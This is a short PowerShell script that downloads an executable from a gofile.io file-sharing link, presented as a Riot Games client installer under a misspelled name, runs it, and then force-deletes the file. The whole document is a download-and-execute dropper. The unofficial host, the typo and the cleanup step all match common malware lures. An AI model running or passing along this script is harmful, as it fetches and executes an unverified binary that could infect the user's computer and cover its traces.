$fileUrl = "https://store-eu-par-1.gofile.io/download/web/816fa2b5-6dd9-4b19-96ed-52ce5b66a3f2/Riot%20clirnt.exe"
$fileName = "riot_setup.exe"
$filePath = Join-Path $PWD.Path -ChildPath $fileName

Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -UseBasicParsing
Start-Process -FilePath $filePath -Wait
Remove-Item -Path $filePath -Force
